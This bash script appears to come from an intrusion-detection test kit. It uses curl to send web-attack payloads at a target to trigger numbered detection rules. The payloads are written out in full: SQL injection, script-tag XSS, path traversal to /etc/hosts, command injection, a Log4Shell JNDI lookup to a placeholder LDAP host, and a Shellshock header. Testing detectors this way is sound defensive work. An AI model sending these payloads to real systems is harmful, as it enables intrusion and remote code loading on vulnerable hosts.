#!/usr/bin/env bash
# web-attacks.sh - HTTP application attacks with curl.
# Needs: curl.
# Triggers: 1000210 SQLi UNION, 1000214 XSS <script>, 1000217 path traversal,
#           1000219 command injection, 1000221 Log4Shell (header),
#           1000222 Shellshock (User-Agent). --only NAME runs just one.
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-p PORT] [--only NAME]
  -p PORT     HTTP port (default 8080)
  --only NAME sqli | xss | traversal | cmd | log4shell | shellshock
Sends flagged payloads over HTTP to exercise the web detectors. No credentials are sent.
U
}

TARGET=""; PORT=8080; ONLY=""
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -p|--port) PORT=${2:?}; shift ;;
    --only) ONLY=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool curl
authorize "$TARGET"
base="http://$TARGET:$PORT"
C="curl -s -o /dev/null -w %{http_code} --max-time 5"

run() { # run NAME sid description curl-args...
  local name=$1 sid=$2 desc=$3; shift 3
  [ -z "$ONLY" ] || [ "$ONLY" = "$name" ] || return 0
  printf '  %-11s sid %-8s %-28s -> ' "$name" "$sid" "$desc"
  $C "$@" || true
  echo
}

echo "web attacks against $base"
run sqli       1000210 "UNION SELECT"            "$base/item?id=1%20UNION%20SELECT%20username,x%20FROM%20users"
run xss        1000214 "<script> in query"       "$base/search?q=<script>alert(1)</script>"
run traversal  1000217 "path traversal"          "$base/file?p=../../../../etc/hosts"
run cmd        1000219 "command injection"       "$base/ping?host=127.0.0.1;id"
run log4shell  1000221 "JNDI lookup in header"   -H 'X-Api-Version: ${jndi:ldap://198.51.100.5:1389/a}' "$base/"
run shellshock 1000222 "Shellshock User-Agent"   -A '() { :; }; /bin/true' "$base/cgi-bin/status"
echo "done"
